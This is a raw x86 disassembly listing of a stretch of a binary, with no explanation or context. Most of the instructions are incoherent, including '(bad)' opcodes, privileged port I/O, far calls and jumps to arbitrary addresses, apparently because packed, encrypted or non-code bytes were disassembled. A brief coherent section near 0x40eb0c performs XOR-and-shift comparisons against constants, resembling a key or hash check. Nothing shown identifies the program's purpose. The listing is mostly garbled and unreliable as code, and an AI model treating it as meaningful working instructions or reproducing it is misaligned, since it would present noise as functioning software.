  40e6c9:	std    
  40e6ca:	jl     0x40e740
  40e6cc:	adc    eax,0x9cd10341
  40e6d1:	push   ecx
  40e6d2:	lock in al,dx
  40e6d4:	call   0x1219:0x5d436cfe
  40e6db:	pop    ebx
  40e6dc:	pop    edx
  40e6dd:	mov    DWORD PTR [edi-0x23],ebx
  40e6e0:	xchg   edx,eax
  40e6e1:	and    eax,DWORD PTR [ecx+0x4a]
  40e6e4:	xchg   edi,eax
  40e6e5:	mov    esp,0x1f3243a1
  40e6ea:	pop    ebx
  40e6eb:	fdiv   QWORD PTR [ecx]
  40e6ed:	pop    esp
  40e6ee:	je     0x96a36dff
  40e6f4:	fwait
  40e6f5:	add    DWORD PTR cs:[esi],0x1612cf37
  40e6fc:	lock ret 
  40e6fe:	jge    0x40e6eb
  40e700:	pop    ds
  40e701:	ins    DWORD PTR es:[edi],dx
  40e702:	or     dl,0xe9
  40e705:	sub    BYTE PTR [eax+edx*8+0x79],ch
  40e709:	jns    0x40e767
  40e70b:	je     0x40e6cf
  40e70d:	jmp    0xeea76d95
  40e712:	in     al,0xce
  40e714:	xor    ebp,esi
  40e716:	fs push ds
  40e718:	std    
  40e719:	ds sbb dh,bh
  40e71c:	ret    0xbc81
  40e71f:	sub    DWORD PTR ds:[esi+0x9],0x4b80c522
  40e727:	jne    0x40e76f
  40e729:	aaa    
  40e72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e72b:	cmp    DWORD PTR [esi+0x16],esp
  40e72e:	or     DWORD PTR [eax+0x2d5c2e93],ecx
  40e734:	xor    al,0xc3
  40e736:	push   cs
  40e737:	ins    BYTE PTR es:[edi],dx
  40e738:	pop    esi
  40e739:	xchg   DWORD PTR [edx+0x244d1d90],ebx
  40e73f:	outs   dx,DWORD PTR ds:[esi]
  40e740:	push   es
  40e741:	xchg   edi,eax
  40e742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e743:	stos   DWORD PTR es:[edi],eax
  40e744:	das    
  40e745:	das    
  40e746:	stos   DWORD PTR es:[edi],eax
  40e747:	or     eax,0xf90b20ba
  40e74c:	push   cs
  40e74d:	push   es
  40e74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e74f:	mov    cl,0x76
  40e751:	loope  0x40e75b
  40e753:	xchg   edi,eax
  40e754:	adc    eax,0x61ab6dc0
  40e759:	fcom   DWORD PTR [esp+ecx*8-0x1b]
  40e75d:	sub    esi,DWORD PTR [edi]
  40e75f:	push   edx
  40e760:	sahf   
  40e761:	fsubr  st(0),st
  40e763:	sti    
  40e764:	shl    BYTE PTR [edx],0xcd
  40e767:	(bad)  
  40e768:	fcom   QWORD PTR [esi+0x3e]
  40e76b:	fidiv  WORD PTR [eax-0x7]
  40e76e:	adc    edi,edi
  40e770:	call   0x8a16:0x64061a31
  40e777:	jbe    0x40e7d0
  40e779:	jo     0x40e703
  40e77b:	add    al,0xfa
  40e77d:	arpl   WORD PTR [edx+ecx*1+0x3830fbc6],si
  40e784:	mov    edx,fs
  40e786:	jecxz  0x40e767
  40e788:	pop    esp
  40e789:	sbb    DWORD PTR [edx+0x75],eax
  40e78c:	mov    esi,0x685a3446
  40e791:	out    dx,al
  40e792:	pop    ecx
  40e793:	xchg   BYTE PTR ds:0x41b360bb,bh
  40e799:	add    DWORD PTR [ecx+0x4f316c83],edx
  40e79f:	ficomp WORD PTR [edx+0x45]
  40e7a2:	sbb    ebp,DWORD PTR [ebp+0x755d674b]
  40e7a8:	inc    ebx
  40e7a9:	arpl   WORD PTR [ebx-0x64],di
  40e7ac:	fwait
  40e7ad:	sbb    eax,0xfafde20b
  40e7b2:	or     eax,0x5fdcf5e1
  40e7b7:	xlat   BYTE PTR ds:[ebx]
  40e7b8:	stos   BYTE PTR es:[edi],al
  40e7b9:	and    eax,0xf8638b4c
  40e7be:	std    
  40e7bf:	or     ebx,DWORD PTR [ebx-0x5964037]
  40e7c5:	int3   
  40e7c6:	out    dx,al
  40e7c7:	dec    edx
  40e7c8:	(bad)
  40e7cb:	dec    ecx
  40e7cc:	pop    ecx
  40e7cd:	adc    edx,ecx
  40e7cf:	mov    esi,0x567b5eb6
  40e7d4:	inc    edx
  40e7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7d6:	imul   eax,ebp,0xb1b0795
  40e7dc:	or     al,BYTE PTR [ebp-0x69]
  40e7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7e0:	jg     0x40e855
  40e7e2:	lods   al,BYTE PTR ds:[esi]
  40e7e3:	add    al,0xf3
  40e7e5:	xlat   BYTE PTR ds:[ebx]
  40e7e6:	loop   0x40e778
  40e7e8:	mov    edx,DWORD PTR ds:[esi+edx*2]
  40e7ec:	cld    
  40e7ed:	mov    bl,0x58
  40e7ef:	ds int 0xc4
  40e7f2:	ins    BYTE PTR es:[edi],dx
  40e7f3:	jno    0x40e843
  40e7f5:	pop    ss
  40e7f6:	mov    al,0x9
  40e7f8:	xor    eax,0x7029f4b9
  40e7fd:	and    dl,ch
  40e7ff:	jecxz  0x40e7a8
  40e801:	pop    ss
  40e802:	lock mov ch,0x3
  40e805:	stc    
  40e806:	(bad)  
  40e807:	imul   ebx,DWORD PTR [edi+ecx*1],0x490a657
  40e80e:	mov    ds:0xd5a9a220,al
  40e813:	dec    BYTE PTR [ebx+eax*4]
  40e816:	sub    ecx,eax
  40e818:	xor    esi,DWORD PTR [edx+0x16]
  40e81b:	pop    edi
  40e81c:	cwde   
  40e81d:	xchg   esi,eax
  40e81e:	pop    ss
  40e81f:	jns    0x40e879
  40e821:	ds pop ds
  40e823:	cwde   
  40e824:	fsub   DWORD PTR [ebx]
  40e826:	jne    0x40e85b
  40e828:	dec    ebx
  40e829:	and    eax,DWORD PTR [edx+0x1e]
  40e82c:	(bad)  
  40e82d:	test   al,0x7
  40e82f:	pop    ecx
  40e830:	bound  ecx,QWORD PTR [edx+0x30]
  40e833:	not    DWORD PTR [edx-0x7b3e156]
  40e839:	fmul   DWORD PTR [eax-0x2f]
  40e83c:	outs   dx,BYTE PTR fs:[esi]
  40e83e:	leave  
  40e83f:	pop    es
  40e840:	inc    ebx
  40e841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e843:	repnz lods al,BYTE PTR ds:[esi]
  40e845:	xchg   ebx,eax
  40e846:	out    dx,al
  40e847:	iret   
  40e848:	add    DWORD PTR [esp+ebx*4+0x50],esp
  40e84c:	jl     0x40e87b
  40e84e:	scas   al,BYTE PTR es:[edi]
  40e84f:	inc    eax
  40e850:	dec    esp
  40e851:	xchg   edx,eax
  40e852:	add    esi,eax
  40e854:	cmp    bl,cl
  40e856:	dec    ebp
  40e857:	sub    dh,ah
  40e859:	jns    0x40e87b
  40e85b:	mov    edi,0x30e555cb
  40e860:	imul   ecx,DWORD PTR [esi],0x69ea867e
  40e866:	add    ah,BYTE PTR [eax]
  40e868:	add    DWORD PTR [esp+edi*1-0x4506e6b4],eax
  40e86f:	mov    al,ds:0xf5d73501
  40e874:	jne    0x40e871
  40e876:	lea    edi,[eax]
  40e878:	push   edx
  40e879:	lahf   
  40e87a:	jno    0x40e8f5
  40e87c:	clc    
  40e87d:	js     0x40e8d6
  40e87f:	sub    edi,ebx
  40e881:	call   0x51ee6f36
  40e886:	jno    0x40e88e
  40e888:	(bad)  
  40e889:	and    eax,edi
  40e88b:	int3   
  40e88c:	addr16 mov dl,0x90
  40e88f:	jle    0x40e8db
  40e891:	jno    0x40e89d
  40e893:	pop    esi
  40e894:	div    BYTE PTR [edx]
  40e896:	int    0xa8
  40e898:	int    0xd7
  40e89a:	dec    ebp
  40e89b:	pop    ss
  40e89c:	push   ecx
  40e89d:	cli    
  40e89e:	sbb    BYTE PTR [edx-0x4f],0xaa
  40e8a2:	pop    esi
  40e8a3:	mov    dh,0x80
  40e8a5:	jl     0x40e8ce
  40e8a7:	cld    
  40e8a8:	std    
  40e8a9:	pop    ss
  40e8aa:	enter  0x296d,0x95
  40e8ae:	les    ebx,FWORD PTR [ebx+0x2b24264d]
  40e8b4:	rol    eax,0x98
  40e8b7:	xchg   edi,eax
  40e8b8:	add    BYTE PTR [ebx],ch
  40e8ba:	jb     0x40e890
  40e8bc:	push   cs
  40e8bd:	lahf   
  40e8be:	inc    esi
  40e8bf:	jp     0x40e8e6
  40e8c1:	sub    BYTE PTR [eax+0x6d],dh
  40e8c4:	push   0x50
  40e8c6:	xor    al,0x6e
  40e8c8:	cmp    DWORD PTR [ebp-0x67d9b7d5],edx
  40e8ce:	out    0x4,al
  40e8d0:	scas   al,BYTE PTR es:[edi]
  40e8d1:	xor    DWORD PTR [esi-0x1fbc0eb6],0xffffffeb
  40e8d8:	gs push edx
  40e8da:	(bad)  
  40e8db:	cmp    edi,DWORD PTR [ebx-0x311b8e79]
  40e8e1:	in     eax,dx
  40e8e2:	adc    eax,0x5674ebbb
  40e8e7:	ja     0x40e873
  40e8e9:	or     eax,0xb6b9ddb4
  40e8ee:	aam    0xd6
  40e8f0:	xchg   ecx,eax
  40e8f1:	dec    esp
  40e8f2:	pop    eax
  40e8f3:	mov    al,0x6c
  40e8f5:	fld    TBYTE PTR [edx+0xd7b2e9]
  40e8fb:	test   al,bl
  40e8fd:	adc    DWORD PTR [ebx-0x3b],edi
  40e900:	out    0x1e,al
  40e902:	and    eax,DWORD PTR fs:[ebp+0x1db2e4cf]
  40e909:	dec    edi
  40e90a:	mov    ds,edi
  40e90c:	in     al,0x2d
  40e90e:	pop    ds
  40e90f:	jb     0x40e8c0
  40e911:	dec    esi
  40e912:	aas    
  40e913:	mov    dl,0x42
  40e915:	lea    ebp,[eax+edi*4-0x1695a4fe]
  40e91c:	xchg   ecx,eax
  40e91d:	add    edx,DWORD PTR [edx]
  40e91f:	loop   0x40e8ce
  40e921:	pop    eax
  40e922:	xchg   DWORD PTR [esi-0x49a3fa7b],edi
  40e928:	dec    edi
  40e929:	xor    DWORD PTR [esi],eax
  40e92b:	outs   dx,BYTE PTR ds:[esi]
  40e92c:	pop    eax
  40e92d:	or     BYTE PTR [edx+0x45],al
  40e930:	or     al,0x6b
  40e932:	mov    eax,ds:0xf1cb1850
  40e937:	dec    edx
  40e938:	cmp    eax,0x7a3c80b6
  40e93d:	fld    TBYTE PTR [eax-0xa]
  40e940:	adc    edi,eax
  40e942:	test   BYTE PTR [ebp+0x1e32726],al
  40e948:	xchg   edx,eax
  40e949:	in     al,0x84
  40e94b:	jge    0x40e94e
  40e94d:	adc    edx,0x8915f831
  40e953:	dec    ecx
  40e954:	pusha  
  40e955:	or     BYTE PTR [eax+ecx*8+0x28],0x5c
  40e95a:	outs   dx,BYTE PTR fs:[esi]
  40e95c:	push   0xffffffc2
  40e95e:	mov    DWORD PTR [ebp+0x42],0x16111022
  40e965:	enter  0x3395,0x49
  40e969:	add    eax,0xdecf75a9
  40e96e:	cmp    bl,cl
  40e970:	mov    ds:0xb3e4b90b,al
  40e975:	mov    esp,0x9093f6fe
  40e97a:	out    dx,eax
  40e97b:	in     eax,0xb3
  40e97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e97e:	push   edi
  40e97f:	push   es
  40e980:	popf   
  40e981:	dec    eax
  40e982:	or     al,0xbe
  40e984:	lock sti 
  40e986:	ins    BYTE PTR es:[edi],dx
  40e987:	(bad)  
  40e988:	push   esp
  40e989:	xchg   esi,eax
  40e98a:	jno    0x40e91b
  40e98c:	jns    0x40e99a
  40e98e:	mov    gs:0x4978ea48,eax
  40e994:	cli    
  40e995:	cmp    ch,0x8a
  40e998:	mov    edi,0xd1e2f6a7
  40e99d:	enter  0x55ba,0x6b
  40e9a1:	(bad)  
  40e9a3:	push   edi
  40e9a5:	lods   eax,DWORD PTR ds:[esi]
  40e9a6:	mov    al,0x43
  40e9a8:	or     bl,BYTE PTR [esi]
  40e9aa:	out    dx,eax
  40e9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9ac:	sbb    edx,DWORD PTR [esi]
  40e9ae:	inc    esi
  40e9af:	cmp    bl,BYTE PTR [ecx]
  40e9b1:	(bad)  
  40e9b2:	sbb    al,0x82
  40e9b4:	cmp    BYTE PTR [edi-0xfb191cb],0x72
  40e9bb:	leave  
  40e9bc:	push   edx
  40e9bd:	in     al,dx
  40e9be:	mov    esi,ds
  40e9c0:	pop    ecx
  40e9c1:	mov    esi,0x34b134a7
  40e9c6:	sbb    ch,al
  40e9c8:	mov    BYTE PTR [esi+0x4e],bh
  40e9cb:	daa    
  40e9cc:	in     eax,0x4e
  40e9ce:	in     al,0xf6
  40e9d0:	stos   DWORD PTR es:[edi],eax
  40e9d1:	in     al,0x73
  40e9d3:	bnd jbe 0x40e9a9
  40e9d6:	pop    ss
  40e9d7:	addr16 mov eax,0x4ea3de8c
  40e9dd:	neg    BYTE PTR [ecx-0x383aca6f]
  40e9e3:	xor    al,0x8b
  40e9e5:	fsubr  DWORD PTR [edi]
  40e9e7:	or     al,0x4f
  40e9e9:	sbb    al,BYTE PTR [esi-0x1e8458fd]
  40e9ef:	cmp    eax,DWORD PTR [edx]
  40e9f1:	add    al,0x95
  40e9f3:	and    ebx,DWORD PTR [eax]
  40e9f5:	push   edi
  40e9f6:	push   edx
  40e9f7:	inc    eax
  40e9f8:	or     DWORD PTR [bx-0x75f0],ebp
  40e9fd:	ret    0x62a6
  40ea00:	and    DWORD PTR [esi-0x1a334d03],0xfffffff6
  40ea07:	repz pop ss
  40ea09:	add    esp,DWORD PTR [esp+esi*2+0x70ec7253]
  40ea10:	mov    al,0xd5
  40ea12:	in     al,dx
  40ea13:	jnp    0x40ea40
  40ea15:	out    dx,eax
  40ea16:	repnz ror dl,0x1b
  40ea1a:	cmp    bh,al
  40ea1c:	xchg   ecx,eax
  40ea1d:	jge    0x40ea0a
  40ea1f:	ret    0x329e
  40ea22:	in     eax,dx
  40ea23:	xchg   BYTE PTR [edi-0x1a],cl
  40ea26:	dec    eax
  40ea27:	inc    ecx
  40ea28:	pop    ds
  40ea29:	bound  edx,QWORD PTR [esi]
  40ea2b:	daa    
  40ea2c:	rcl    DWORD PTR [edx-0x6e3fe842],1
  40ea32:	dec    ebp
  40ea33:	call   0x74c6:0x126676db
  40ea3a:	arpl   dx,di
  40ea3c:	stos   DWORD PTR es:[edi],eax
  40ea3d:	mov    esp,0xfaada64d
  40ea42:	sbb    eax,0xf5ac4f73
  40ea47:	mov    ebx,0xedcc040a
  40ea4c:	in     al,dx
  40ea4d:	jl     0x40e9da
  40ea4f:	push   ss
  40ea50:	loope  0x40ea45
  40ea52:	mov    ebx,0xb86f2420
  40ea57:	hlt    
  40ea58:	mov    esp,0x20f87477
  40ea5d:	mov    ah,0x3d
  40ea5f:	daa    
  40ea60:	out    0x81,al
  40ea62:	rcr    BYTE PTR [ebx-0x7a],0xce
  40ea66:	xchg   edi,eax
  40ea67:	leave  
  40ea68:	sub    dl,BYTE PTR [ebx+0x62d3d264]
  40ea6e:	ds adc al,0xbb
  40ea71:	out    dx,al
  40ea72:	adc    BYTE PTR [esi+0x14],al
  40ea75:	mov    bh,0xb7
  40ea77:	push   0xf926cfba
  40ea7c:	cli    
  40ea7d:	dec    dl
  40ea7f:	mov    bl,0xfc
  40ea81:	sub    al,0xe1
  40ea83:	jne    0x40ea38
  40ea85:	xchg   edx,eax
  40ea86:	scas   eax,DWORD PTR es:[edi]
  40ea87:	cmp    ebp,edx
  40ea89:	mov    dl,0x45
  40ea8b:	mov    BYTE PTR [eax+esi*4+0x362b2e0f],cl
  40ea92:	shr    BYTE PTR [edx+eiz*1-0x59],0x5e
  40ea97:	stos   DWORD PTR es:[edi],eax
  40ea98:	dec    edi
  40ea99:	jl     0x40ea9d
  40ea9b:	fcom   DWORD PTR [edx]
  40ea9d:	jp     0x40ea97
  40ea9f:	popa   
  40eaa0:	in     eax,dx
  40eaa1:	fst    DWORD PTR [ecx-0x2d]
  40eaa4:	cmp    DWORD PTR [eax],ebp
  40eaa6:	pop    ds
  40eaa7:	(bad)  
  40eaa9:	ja     0x40eac5
  40eaab:	dec    ebp
  40eaac:	dec    esi
  40eaad:	mov    eax,ds:0x3c8a2a0b
  40eab2:	cmp    al,0x26
  40eab4:	popa   
  40eab5:	or     DWORD PTR [edx+0x276633e3],eax
  40eabb:	stc    
  40eabc:	push   cs
  40eabd:	outs   dx,BYTE PTR ds:[esi]
  40eabe:	jbe    0x40ea40
  40eac0:	push   ss
  40eac1:	ret    
  40eac2:	cdq    
  40eac3:	jns    0x40eb26
  40eac5:	xor    BYTE PTR [edi-0x3b],bh
  40eac8:	into   
  40eac9:	out    0xd5,eax
  40eacb:	popa   
  40eacc:	jmp    0x40eab5
  40eace:	or     DWORD PTR [eax],0xffffffc5
  40ead1:	ins    BYTE PTR es:[edi],dx
  40ead2:	imul   ebp,eax,0xffffffd4
  40ead5:	inc    esi
  40ead6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ead7:	arpl   bx,sp
  40ead9:	popf   
  40eada:	ret    0xc754
  40eadd:	retf   
  40eade:	and    eax,0x31cea0d
  40eae3:	or     bh,ch
  40eae5:	dec    esp
  40eae6:	or     BYTE PTR [ecx+ecx*1+0x7d8615],bh
  40eaed:	jg     0x40ead2
  40eaef:	jmp    0x2bbedc15
  40eaf4:	sar    DWORD PTR [ebx-0x7a],1
  40eaf7:	mov    ch,0x1d
  40eaf9:	push   es
  40eafa:	mov    ebp,0x75d3f5b2
  40eaff:	out    0x44,eax
  40eb01:	call   0x58e:0x505ecdd2
  40eb08:	fstp   QWORD PTR [esi]
  40eb0a:	fisub  WORD PTR [edx]
  40eb0c:	push   edi
  40eb0d:	mov    eax,DWORD PTR [ebx]
  40eb0f:	mov    DWORD PTR [ebp-0x2c],edx
  40eb12:	mov    edx,DWORD PTR [ebx+0x4]
  40eb15:	mov    edx,eax
  40eb17:	xor    eax,eax
  40eb19:	shl    edx,0x1e
  40eb1c:	xor    edx,0xc0000000
  40eb22:	mov    DWORD PTR [ebp-0x70],eax
  40eb25:	mov    eax,DWORD PTR [ebx]
  40eb27:	mov    DWORD PTR [ebp-0x6c],edx
  40eb2a:	mov    edx,DWORD PTR [ebx+0x4]
  40eb2d:	xor    eax,0xba699573
  40eb32:	xor    edx,0x9c0a89d8
  40eb38:	shrd   eax,edx,0x2
  40eb3c:	or     eax,DWORD PTR [ebp-0x70]
  40eb3f:	shr    edx,0x2
  40eb42:	mov    DWORD PTR [ebp-0x38],eax
  40eb45:	mov    eax,edx
  40eb47:	or     eax,DWORD PTR [ebp-0x6c]
  40eb4a:	mov    DWORD PTR [ebp-0x5c],edx
  40eb4d:	cmp    ecx,DWORD PTR [ebp-0x38]
  40eb50:	jne    0x40da02
  40eb56:	cmp    DWORD PTR [ebp-0x2c],eax
  40eb59:	je     0x41a17f
  40eb5f:	jmp    0x40da02
  40eb64:	mov    eax,DWORD PTR [esi]
  40eb66:	mov    ecx,DWORD PTR [esi+0x4]
  40eb69:	mov    ecx,eax
  40eb6b:	shl    ecx,0x1e
  40eb6e:	xor    ecx,0xc0000000
  40eb74:	mov    DWORD PTR [ebp+0x14],ecx
  40eb77:	mov    ecx,DWORD PTR [esi]
  40eb79:	mov    edx,DWORD PTR [esi+0x4]
  40eb7c:	xor    ecx,0xba699573
  40eb82:	xor    edx,0x9c0a89d8
  40eb88:	shrd   ecx,edx,0x2
  40eb8c:	xor    eax,eax
  40eb8e:	or     ecx,eax
  40eb90:	mov    eax,DWORD PTR [ebx]
  40eb92:	mov    DWORD PTR [ebp-0x68],ecx
  40eb95:	mov    ecx,DWORD PTR [ebx+0x4]
  40eb98:	jmp    0x40f122
  40eb9d:	and    eax,0x9542a757
  40eba2:	adc    bl,BYTE PTR [eax]
  40eba4:	xor    BYTE PTR [eax],bl
  40eba6:	mov    al,ds:0xaf71a805
  40ebab:	pop    esi
  40ebac:	mov    dl,0x8e
  40ebae:	mov    dl,BYTE PTR [esi]
  40ebb0:	push   ss
  40ebb1:	cmp    eax,0x70161604
  40ebb6:	jns    0x40eb9a
  40ebb8:	out    0xe0,eax
  40ebba:	addr16 pop ss
  40ebbc:	mov    WORD PTR ds:0x324542dc,cs
  40ebc2:	push   esp
  40ebc3:	idiv   bl
  40ebc5:	lahf   
  40ebc6:	cmp    bh,dh
  40ebc8:	add    al,0x15
  40ebca:	aam    0x6b
  40ebcc:	jmp    0x40ec2c
  40ebce:	adc    DWORD PTR [ebp-0x7876b819],edx
  40ebd4:	pop    eax
  40ebd5:	push   eax
  40ebd6:	cld    
  40ebd7:	push   es
  40ebd8:	ror    DWORD PTR [eax+0xc8d66e4],1
  40ebde:	mov    WORD PTR [edi-0x74],es
  40ebe1:	sar    DWORD PTR [edx-0x3de9c5d2],cl
  40ebe7:	xor    eax,0x5210f214
  40ebec:	pop    eax
  40ebed:	sub    BYTE PTR [esi+0x36],al
  40ebf0:	mov    ch,0x67
  40ebf2:	adc    al,0x80
  40ebf4:	bound  ecx,QWORD PTR [eax-0x35]
  40ebf7:	(bad)  
  40ebf9:	jb     0x40ebf8
  40ebfb:	sub    al,0x4b
  40ebfd:	stos   BYTE PTR es:[edi],al
  40ebfe:	out    dx,al
  40ebff:	jb     0x40eb94
  40ec01:	or     DWORD PTR [ecx-0x39a19068],ecx
  40ec07:	and    BYTE PTR [ebp+0x3],0x20
  40ec0b:	jmp    0xde0f:0xca4e4d53
  40ec12:	loop   0x40ec58
  40ec14:	jle    0x40ec2d
  40ec16:	xchg   edx,eax
  40ec17:	or     ebp,DWORD PTR [ebp-0x48]
  40ec1a:	mov    dl,0x7e
  40ec1c:	cmc    
  40ec1d:	sub    BYTE PTR ds:0xabc93f97,al
  40ec23:	pop    edi
  40ec24:	mov    dh,0xb
  40ec26:	mov    ds:0x93ee7646,al
  40ec2b:	cmp    DWORD PTR [ebx-0x25cbcdfe],edi
  40ec31:	pushf  
  40ec32:	xor    DWORD PTR [ecx+0x2f77d1c8],edx
  40ec38:	jg     0x40ecae
  40ec3a:	fcomp  DWORD PTR [ebp+edx*4+0x78]
  40ec3e:	xlat   BYTE PTR ds:[ebx]
  40ec3f:	aam    0x71
  40ec41:	arpl   WORD PTR [esi],cx
  40ec43:	psraw  xmm0,XMMWORD PTR [esi-0x3b15e33b]
  40ec4b:	xchg   esp,eax
  40ec4c:	inc    ebp
  40ec4d:	sbb    BYTE PTR [edx],dl
  40ec4f:	arpl   WORD PTR [esi+edx*8+0x54a27b7a],di
  40ec56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec57:	cwde   
  40ec58:	push   0x78f79117
  40ec5d:	pop    edi
  40ec5e:	dec    edx
  40ec5f:	push   0xe136ec8c
  40ec64:	sbb    al,0xc4
  40ec66:	int3   
  40ec67:	ret    
  40ec68:	pop    ebx
  40ec69:	mov    fs:0xde1f1744,al
  40ec6f:	fcomp  st(3)
  40ec71:	sbb    DWORD PTR [esi+0x51c86f5],esp
  40ec77:	mov    fs,WORD PTR [eax+0xbc27d1]
  40ec7d:	das    
  40ec7e:	add    dl,BYTE PTR [ebx-0x231508e8]
  40ec84:	sar    cl,1
  40ec86:	pop    eax
  40ec87:	and    eax,0x45272ee0
  40ec8c:	test   dh,al
  40ec8e:	jl     0x40ec7e
  40ec90:	adc    esi,DWORD PTR [ebp+0x6b]
  40ec93:	(bad)  
  40ec94:	mov    ecx,0xa5586f05
  40ec99:	cdq    
  40ec9a:	leave  
  40ec9b:	sar    BYTE PTR [ebp+edx*4+0x4e],1
  40ec9f:	jg     0x40ece7
  40eca1:	ficom  WORD PTR [esi]
  40eca3:	or     esi,DWORD PTR [ecx-0x5dcce72c]
  40eca9:	push   edx
  40ecaa:	scas   al,BYTE PTR es:[edi]
  40ecab:	mov    edi,0xca7b0ebc
  40ecb0:	lods   al,BYTE PTR ds:[esi]
  40ecb1:	pop    ebp
  40ecb2:	push   es
  40ecb3:	or     bl,al
  40ecb5:	aaa    
  40ecb6:	sbb    BYTE PTR [edi-0x1e],cl
  40ecb9:	and    DWORD PTR [esi+0x56],esp
  40ecbc:	stos   BYTE PTR es:[edi],al
  40ecbd:	imul   ecx,DWORD PTR [eax+0x3e],0xffffff97
  40ecc1:	std    
  40ecc2:	retf   
  40ecc3:	jae    0x40ecb9
  40ecc5:	dec    ebx
  40ecc6:	add    ch,BYTE PTR [ecx+eax*4+0x6ec6213f]
  40eccd:	and    al,0x5b
  40eccf:	in     eax,dx
  40ecd0:	fiadd  DWORD PTR gs:[eax]
  40ecd3:	xchg   ebp,eax
  40ecd4:	sub    BYTE PTR [edx],bh
  40ecd6:	inc    edx
  40ecd7:	es cmc 
  40ecd9:	inc    edx
  40ecda:	sbb    eax,0xd313f661
  40ecdf:	fucompp 
  40ece1:	and    bl,BYTE PTR [ebx-0x5d4e33c]
  40ece7:	mov    DWORD PTR [edx+0x4e80b05e],edi
  40eced:	shr    DWORD PTR [edx-0x77],0x46
  40ecf1:	dec    edi
  40ecf2:	loope  0x40ed37
  40ecf4:	sub    eax,ebx
  40ecf6:	add    al,0xc0
  40ecf8:	sub    al,0x92
  40ecfa:	ins    BYTE PTR es:[edi],dx
  40ecfb:	push   es
  40ecfc:	gs inc edi
  40ecfe:	call   0xb95d:0xa2e74c8a
  40ed05:	outs   dx,BYTE PTR ds:[esi]
  40ed06:	sub    ch,bl
  40ed08:	jmp    0x3da6720d
  40ed0d:	push   0x5
  40ed0f:	popa   
  40ed10:	imul   edx,DWORD PTR [edx-0x61],0xffffffe7
  40ed14:	sbb    dl,BYTE PTR [eax+0x38]
  40ed17:	inc    edx
  40ed18:	stos   DWORD PTR es:[edi],eax
  40ed19:	push   ebp
  40ed1a:	shl    BYTE PTR [ecx],0xcf
  40ed1d:	out    0xf3,al
  40ed1f:	xchg   edi,eax
  40ed20:	out    0xee,al
  40ed22:	push   cs
  40ed23:	inc    edx
  40ed24:	and    ah,BYTE PTR [ebx+0x10]
  40ed27:	push   edi
  40ed28:	aad    0xc
  40ed2a:	jge    0x40ed98
  40ed2c:	mov    edi,0x6a0bd4f3
  40ed31:	sbb    al,0xc6
  40ed33:	xchg   ecx,eax
  40ed34:	or     BYTE PTR [esi-0x13f4c534],0x48
  40ed3b:	arpl   si,bp
  40ed3d:	xor    DWORD PTR [ebx],ecx
  40ed3f:	jnp    0x40ed6e
  40ed41:	fisub  WORD PTR [esi+0x55]
  40ed44:	ret    0xed7e
  40ed47:	inc    ebx
  40ed48:	rcl    ecx,0xaa
  40ed4b:	test   BYTE PTR [esi+0x2039f65],ah
  40ed51:	or     BYTE PTR [eax+edx*8+0x63],cl
  40ed55:	dec    ebx
  40ed56:	clc    
  40ed57:	vpmaxsw xmm1,xmm3,XMMWORD PTR [edi]
  40ed5b:	daa    
  40ed5c:	js     0x40eda9
  40ed5e:	mov    BYTE PTR [eax],dh
  40ed60:	mov    ch,dh
  40ed62:	xchg   edi,eax
  40ed63:	cwde   
  40ed64:	or     dh,0x38
  40ed67:	ss dec eax
  40ed69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6a:	bound  edx,QWORD PTR [eax+0x3cc326bb]
  40ed70:	mov    edi,0xcf1deace
  40ed75:	scas   eax,DWORD PTR es:[edi]
  40ed76:	cmp    DWORD PTR [edi],0xa62d6cec
  40ed7c:	jmp    0x7a64c27e
  40ed81:	test   al,0x70
  40ed83:	popf   
  40ed84:	xlat   BYTE PTR ds:[ebx]
  40ed85:	sbb    eax,0x613952a2
  40ed8a:	sbb    BYTE PTR [ecx+ebx*4-0x4f089bad],bl
  40ed91:	xlat   BYTE PTR ds:[ebx]
  40ed92:	add    dl,cl
  40ed94:	xor    esi,esi
  40ed96:	sub    eax,ebp
  40ed98:	cs out dx,eax
  40ed9a:	cld    
  40ed9b:	cmp    al,0x77
  40ed9d:	sbb    eax,0xe6f8d755
  40eda2:	mov    WORD PTR [ebx+0x3fd295b6],es
  40eda8:	sub    DWORD PTR [edi+0x309c939d],ebx
  40edae:	mov    DWORD PTR [ecx+0x5d6a4343],ebp
  40edb4:	les    ebp,FWORD PTR [edx]
  40edb6:	ins    DWORD PTR es:[edi],dx
  40edb7:	add    dl,BYTE PTR ds:0x4dbb3bc9
  40edbd:	out    dx,eax
  40edbe:	retf   0xe843
  40edc1:	out    0x44,eax
  40edc3:	or     edx,DWORD PTR [esi]
  40edc5:	dec    esp
  40edc6:	js     0x40ed69
  40edc8:	stos   BYTE PTR es:[edi],al
  40edc9:	xchg   ebp,eax
  40edca:	or     eax,0xe6d69d03
  40edcf:	mov    ebx,0xd8add0cc
  40edd4:	pop    ecx
  40edd5:	jmp    0xb324:0x550d7e4
  40eddc:	dec    ebp
  40eddd:	xlat   BYTE PTR ds:[ebx]
  40edde:	add    al,0x72
  40ede0:	(bad)  
  40ede2:	dec    BYTE PTR [eax+edx*1]
  40ede5:	inc    esi
  40ede6:	rcl    BYTE PTR [eax+0xe41703c],cl
  40edec:	jecxz  0x40edd1
  40edee:	jne    0x40edc5
  40edf0:	jge    0x40ed9e
  40edf2:	inc    edi
  40edf3:	sbb    eax,0x39775e2f
  40edf8:	ja     0x40ee16
  40edfa:	popa   
  40edfb:	xlat   BYTE PTR ds:[ebx]
  40edfc:	and    BYTE PTR [ebp+0x1879f7e6],dl
  40ee02:	add    BYTE PTR [eax+0x7e],ch
  40ee05:	xchg   ebx,esi
  40ee07:	sti    
  40ee08:	push   0xe746c34e
  40ee0d:	dec    esp
  40ee0e:	ret    0x3468
  40ee11:	lods   eax,DWORD PTR ds:[esi]
  40ee12:	add    dh,ah
  40ee14:	jo     0x40edd6
  40ee16:	stos   BYTE PTR es:[edi],al
  40ee17:	(bad)  
  40ee18:	dec    ebx
  40ee19:	into   
